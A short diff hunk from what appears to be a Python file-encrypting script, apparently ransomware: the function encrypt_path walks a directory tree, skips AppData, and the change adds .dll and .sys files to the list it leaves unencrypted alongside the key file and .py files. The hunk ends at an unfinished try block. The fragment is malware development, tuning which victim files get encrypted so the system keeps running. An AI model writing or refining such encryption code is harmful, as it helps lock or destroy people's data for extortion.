@@ -53,7 +53,7 @@ def encrypt_path():
             dirs.remove('AppData') 
         for x in files:
             full_path = os.path.join(root , x)
-            if x == "KEY" or x.endswith(".py"):
+            if x == "KEY" or x.endswith(".py") or x.endswith(".dll") or x.endswith(".sys"):
                 continue
             try : 
                 
